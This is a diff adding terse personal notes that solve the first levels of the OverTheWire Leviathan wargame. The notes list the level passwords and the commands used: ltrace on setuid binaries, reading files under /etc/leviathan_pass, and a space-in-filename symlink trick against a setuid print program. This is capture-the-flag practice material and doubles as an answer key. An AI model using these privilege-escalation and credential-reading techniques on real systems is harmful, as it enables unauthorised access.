@@ -1,0 +1,15 @@
+#log to level 0
+ssh leviathan0@leviathan.labs.overthewire.org -p 2223 #password leviathan0
+
+#level 0 to level 1
+cat .backup/bookmark.html|grep password >>>. PPIfmI1qsA
+
+#level 1 to level 2
+ltrace ./check then enter "sex"
+cat /etc/leviathan_pass/leviathan2. >>mEh5PNl10e
+
+#level2 to level 3
+
+ltrace ./prinfile /etc/leviathan_pass/leviathan3 >>Q0G8j4sakn
+touch /tmp/ib/sor\ space
+ln -s /etc/leviathan_pass/leviathan3 /tmp/ib/sor
